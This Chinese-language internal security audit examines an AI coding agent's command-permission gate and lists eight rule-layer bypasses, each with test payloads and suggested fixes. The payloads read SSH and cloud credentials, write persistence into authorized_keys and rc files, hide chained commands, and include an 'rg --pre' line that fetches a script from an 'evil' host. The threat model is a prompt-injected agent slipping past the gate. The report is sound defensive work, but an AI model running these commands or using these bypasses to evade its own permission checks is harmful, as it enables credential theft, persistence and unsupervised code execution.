# 规则层安全审计报告

审计日期：2026-08-26（首轮）／ 2026-08-26（重扫复核，仓库更名 pi-verdict、开源前窗口）
审计对象：`extensions/auto-mode.ts` 规则层（bash 白名单 + 路径敏感度分级）
状态：**8 项漏洞全部未修复**——重扫实测确认所有攻击载荷仍返回 `allow`

> 内部文档：含具体攻击载荷与行号定位。仓库处于公开发布前窗口（npm publish 就绪 + CI 已配置），入库前请决定是否随仓库公开。

---

## 审计范围与方法

- 首轮：全仓库（全部非 Markdown 文件逐行 + 全部 Markdown/lock 文件密钥扫描 + git 全历史 commit message 与 `git log -p --all` 密钥模式扫描），8 项疑似漏洞经并行误报过滤子任务逐项独立复核，全部确认为真阳性（置信度 8-10/10）
- 重扫：逐行比对当前代码与首轮版本（逐字节一致，规则层未被触及），并用 `Bun.Transpiler` 内存执行仓库真实 `classifyBash`/`classifyByRules` 对全部攻击载荷实测裁决（不实际运行系统命令）

## 安全模型（审计前提）

- Pi 运行时默认 YOLO 模式，本扩展是唯一权限闸门
- 规则层 `allow` = 零人工确认直接执行（`extensions/auto-mode.ts:586-590`），并**完全短路**第 2 层模型分类器
- 不可信输入面 = agent 发出的 tool_call 参数（prompt injection → agent 可发任意命令）
- 因此规则层放行绕过 = 完全突破；以下 8 项均为核心安全功能的具体失效

## 实测裁决汇总（重扫，2026-08-26）

| # | 漏洞 | 实测载荷（节选） | 裁决 |
|---|------|-----------------|------|
| V1 | bash 文件操作数无路径检查 | `cat ~/.ssh/id_rsa` | ALLOW |
| V2 | `>`/`>>` 重定向目标不检查 | `echo evil-line > ~/.ssh/authorized_keys` | ALLOW |
| V3 | 换行/`&`/`$()`/`<()` 藏命令 | `ls\nbash /tmp/evil.sh` | ALLOW |
| V4 | `env` 前缀执行任意命令 | `env npx -y evil-pkg` | ALLOW |
| V5 | `rg` `--pre` 检查为死代码 | `rg --pre=sh pattern` | ALLOW |
| V6 | `OUTPUT_FLAG_COMMANDS` 短路使 `-o` 检查失效 | `sort -o ~/.bashrc payload.txt` | ALLOW |
| V7 | git flag 精确匹配，`--output=` 绕过 | `git log --format=x --output=~/Library/LaunchAgents/x.plist` | ALLOW |
| V8 | S0 密钥路径清单遗漏 | `read ~/.npmrc` | ALLOW |

**对照组**（证明绕过真实有效）：

- `npm install evil-pkg` 单独 → `GRAY`（正确交分类器）；套上 `env` 或挂在白名单首词后 → `ALLOW`（V3/V4 生效性证明）
- `read ~/.ssh/id_rsa` → `DENY`（S0 控制存在但清单不全，V8 生效性证明）

---

## V1：bash 文件操作数无路径检查（任意敏感文件读取）

- 位置：`extensions/auto-mode.ts:167`（白名单 46-53 行；`classifyPath` 193-207 行）
- 严重级：High（置信度 9/10）
- 描述：S0/S1 路径分级只应用于 `read/write/edit/grep/find/ls` 工具的 `path` 参数；bash 命令的文件操作数从不做任何路径检查。`cat`/`grep`/`head`/`jq`/`less` 均在无条件白名单，命中即放行。同一策略经 read 工具会被 S0 硬 deny，换 bash 的 `cat` 即绕过；S1 系统路径（如 `cat /etc/*`）同样被从 gray 降级为硬 allow。
- 实测载荷：`cat ~/.ssh/id_rsa`、`cat ~/.aws/credentials`、`jq . ~/.pi/agent/auth.json` → 全部 ALLOW
- 利用场景：被注入的 agent 调用 bash 执行 `cat ~/.ssh/id_rsa` → 规则层确定性放行 → 私钥/云凭证进入模型上下文，可经模型回复外传
- 修复建议：对白名单命令的文件操作数（位置参数、`-f` 类 flag）复用 `classifyPath` 的 S0/S1 分级；或 bash 白名单命令含 `~`/绝对路径操作数时降级 gray

## V2：输出重定向目标不检查（任意文件写入）

- 位置：`extensions/auto-mode.ts:155-174`（危险正则中唯一重定向规则仅覆盖裸块设备，77 行）
- 严重级：High（置信度 9/10）
- 描述：`classifyBash` 只对每段提取命令名比对白名单，从不检查 `>`/`>>` 重定向目标。而 `classifyPath` 的 S1/S2 规则（188-189 行）明确列有 `authorized_keys`、`.bashrc/.zshrc` 等受保护路径——设计意图就是拦截这些写入，但该检查只挂在 write/edit 工具上，bash 重定向完全绕过。单条 `echo` 即可完成利用，无需 staging。
- 实测载荷：`echo evil-line > ~/.ssh/authorized_keys`、`echo export PATH=~/bin:$PATH >> ~/.zshrc` → 全部 ALLOW
- 利用场景：写 `authorized_keys` 获得 SSH 持久化；写 rc 文件实现下次开 shell RCE；全程零确认
- 修复建议：解析每段重定向目标并套用写路径分级（S0/S1/S2 deny、CWD 外 gray）；无法可靠解析时整段降级 gray
- 附注：README.md:95 自述 *"revisit if real traffic shows sensitive-path redirects slipping through"*——重定向旁路已被识别为已知风险但未修复

## V3：shell 组合运算符隐藏命令（跳过分类器）

- 位置：`extensions/auto-mode.ts:95`（`splitShellChain` 93-98 行；powershell 分支 212-213 行复用同一函数）
- 严重级：High（置信度 9/10）
- 描述：`splitShellChain` 只按 `&&`/`||`/`;`/`|` 切分；换行、单个 `&`、命令替换 `$(...)`、进程替换 `<(...)`、反引号均不在切分与检查范围内，`segmentArgv` 又只检查首词。把真实命令挂在白名单首词之后即可完全绕开分类器。README「已知限制」承认的是引号内运算符的过度切分（误报方向），与此处漏检（漏报方向）是相反的失效模式。
- 实测载荷：`ls\nbash /tmp/evil.sh`、`cat foo & npm install evil-pkg`、`git log\nnpm install left-pad`、`echo $(bash /tmp/evil.sh)`、`cat <(npx -y evil-pkg)` → 全部 ALLOW
- 利用场景：prompt injection 后 agent 发出 `ls\nbash /tmp/evil.sh` → 规则层放行 → 任意命令无确认执行
- 修复建议：引入 shell AST 解析（`research/rule-engine-sim/measure.ts` 已验证 tree-sitter-bash 方案可复用）；或保守降级——命令含换行/`&`/`$(`/`<(`/反引号一律 gray

## V4：`env` 前缀执行任意命令

- 位置：`extensions/auto-mode.ts:52`
- 严重级：High（置信度 9/10）
- 描述：`env` 位于无条件安全集合，而 `env <cmd> <args>` 的语义就是执行 `<cmd>`。`segmentArgv` 只剥离 `VAR=value` 前缀，`env` 不匹配该形式，argv[0] 即 `env`，命中即放行，其后的命令永不被检查；basename 归一化使 `/usr/bin/env` 形式同样绕过。白名单注释自称"只读/无副作用命令"，与 `env` 语义矛盾。
- 实测载荷：`env npx -y evil-pkg`、`env pip install evil` → 全部 ALLOW（裸命令本应 GRAY）
- 利用场景：`env npx -y <恶意 npm 包>`（npx 直接下载执行）→ 任意代码执行；`env python -c`、`env node -e`、`env bash script.sh` 同理
- 修复建议：`env` 移出无条件集合，改为条件规则——对 `env` 后续 token 递归套用白名单/条件检查

## V5：`rg` 无条件放行使 `--pre` 检查成为死代码（任意命令执行）

- 位置：`extensions/auto-mode.ts:51`（`RG_FORBIDDEN` 定义 65 行，不可达检查 122-123 行）
- 严重级：High（置信度 9/10）
- 描述：`rg` 在无条件白名单，167 行命中即 `continue`，`isConditionalSafe` 中针对 rg 的 `RG_FORBIDDEN`（`--pre` 等）是不可达死代码——作者意图拦截 `--pre`，检查顺序违背了该意图。ripgrep 的 `--pre=<cmd>` 会对每个被搜索文件执行该命令。附带缺陷：`RG_FORBIDDEN.has(t)` 为精确匹配，`--pre=<cmd>` 附带形式即使检查可达也拦不住。
- 实测载荷：`rg --pre=sh pattern`、`rg --pre /bin/sh pattern` → 全部 ALLOW
- 利用场景：`rg --pre='bash -c "curl http://evil/x.sh -o /tmp/x"' pattern .` → 规则层放行 → ripgrep 在每个文件上执行攻击者命令
- 修复建议：`rg` 移入条件白名单，且 flag 检查改为前缀匹配（`t === f || t.startsWith(f + "=")`）
- 附注：`date` 的 `-s`/`--set` 检查（132-133 行）同理为死代码，影响较低

## V6：`OUTPUT_FLAG_COMMANDS` 短路使 `-o` 写文件检查失效（任意文件写入）

- 位置：`extensions/auto-mode.ts:170`（集合定义 66 行；被短路的检查 124-128 行）
- 严重级：High（置信度 10/10）
- 描述：`if (OUTPUT_FLAG_COMMANDS.has(cmd) || isConditionalSafe(argv)) continue;` —— `sort/base64/iconv/shuf` 命中集合即直接放行，`||` 短路使 124-128 行针对这些命令的 `-o/--output` 拦截成为不可达死代码。附带缺陷：128 行检查本身也是精确匹配，`--output=<path>` 附带形式即使可达也拦不住。
- 实测载荷：`sort -o ~/.bashrc payload.txt`、`sort --output=~/.bashrc payload.txt`、`iconv -o /tmp/x in.txt` → 全部 ALLOW
- 利用场景：在 CWD 内写 `payload.txt`（205 行规则放行），再执行 `sort -o ~/.bashrc payload.txt` → 以完全可控内容覆盖任意路径文件（rc 文件/authorized_keys 持久化）
- 修复建议：删除 `OUTPUT_FLAG_COMMANDS.has(cmd) ||` 分支统一走 `isConditionalSafe`，并将 `-o` 拦截改为前缀匹配覆盖 `--output=<path>` 形态

## V7：git 禁止 flag 精确匹配，`=` 附带形式绕过（任意内容写任意文件）

- 位置：`extensions/auto-mode.ts:114`（集合定义 60-63 行；`log` 在 `GIT_READONLY_SUBCOMMANDS` 56-59 行）
- 严重级：Medium（置信度 9/10）
- 描述：`rest.some((t) => GIT_FORBIDDEN_FLAGS.has(t))` 为精确 token 相等，`--output=/path`、`--git-dir=/x`、`--work-tree=/x`、`--exec=`、`--ext-diff=`、`--textconv=` 等附带形式均不等于集合中的裸 flag。`git log --format=<字面文本> --output=<路径>` 的输出内容完全由 `--format` 字面量控制、写入任意路径（git-log 文档化行为）。
- 实测载荷：`git log --format=x-cron-line --output=~/Library/LaunchAgents/x.plist` → ALLOW
- 利用场景：写 `authorized_keys`/crontab/rc 文件实现零确认持久化
- 修复建议：flag 检查改为前缀匹配（`t === f || t.startsWith(f + "=")`），或含 `--output`/`-o` 的 git 调用降级 gray
- 附注：写入内容按 repo 内 commit 数重复（多 commit repo 下 XML plist 可能变形；authorized_keys/crontab 场景不受影响）

## V8：S0 密钥路径清单遗漏常见凭证文件

- 位置：`extensions/auto-mode.ts:184-187`（read 分支 218-226 行）
- 严重级：Medium（置信度 8/10）
- 描述：S0_SECRET 意图覆盖凭证文件（已含 `.ssh/`、`.aws/`、`.gnupg/`、`.env*`、`id_rsa`、`*.pem`、`credentials`、gh CLI 配置），但遗漏 `~/.netrc`、`~/.npmrc`、`~/.pypirc`、`~/.kube/config`、`~/.docker/config.json`、`.envrc` 等标准明文凭证文件——控制自身的具体不一致，而非泛化加固缺失。grep/find/ls 共用同一读分支，泄露面不限于 read 工具；V1 的 `cat` 旁路使该清单的 bash 侧完全失效。
- 实测载荷：`read ~/.npmrc`、`~/.netrc`、`~/.kube/config`、`~/.docker/config.json` → 全部 ALLOW
- 利用场景：读 `~/.npmrc`（registry `_authToken`）或 `~/.netrc`（明文密码）→ 凭证进入模型上下文并外传
- 修复建议：扩充 S0 至 `\.netrc$`、`\.npmrc$`、`\.pypirc$`、`\.kube(/|$)`、`\.docker/config\.json$`、`\.vault-token`、`\.gem/credentials`、`\.envrc`；路径检查建议基于 `realpath`（现行字符串正则不解析符号链接）

---

## 已排除区域（未发现漏洞）

- git 历史/commit message：全历史密钥模式扫描零命中（含开源前敏感信息脱敏提交 `93a66d7`）
- `research/cache-sim/fetch-io.ts`：仅向环境变量提供的 Langfuse 地址发请求，响应只经 `JSON.parse` 分析、从不 eval；凭证全部取自环境变量
- `research/rule-engine-sim/measure.ts`：`new Function` 仅执行本仓库自身源码切片（可信输入）
- `--auto-mode-debug` 日志：仅记录命令行/路径，不记录密钥

## 共同根因与修复优先级

根因：白名单层「只看段首词 + 无 shell AST + 无文件操作数/重定向目标检查 + flag 精确匹配」。

修复优先级：**V3/V4/V5（直接 RCE）→ V1/V2（凭证窃取/持久化）→ V6/V7 → V8**。

低成本快速修复（发布前窗口建议）：

1. V4：`env` 移出 `BASH_SAFE_UNCONDITIONAL`（一行）
2. V5：`rg` 移入 `isConditionalSafe` 条件分支 + 前缀匹配（数行）
3. V6：删除 170 行 `OUTPUT_FLAG_COMMANDS.has(cmd) ||` 短路（一行）+ 128 行改前缀匹配
4. V7：114 行改前缀匹配（一行）
5. V3：保守降级——命令含换行/`&`/`$(`/`<(`/反引号一律 gray（数行）
6. V8：扩充 S0 正则清单（数行）

统一架构修复（中期）：tree-sitter-bash AST 解析 + 重定向目标/文件操作数提取 + `classifyPath` 统一分级——V1/V2/V3/V5/V6/V7 一次性解决（`research/rule-engine-sim/measure.ts` 已验证可行性；此前因收益测量结论暂缓，见 `research/rule-engine-sim/README.md`，安全审计结论支持重新评估该决议）。
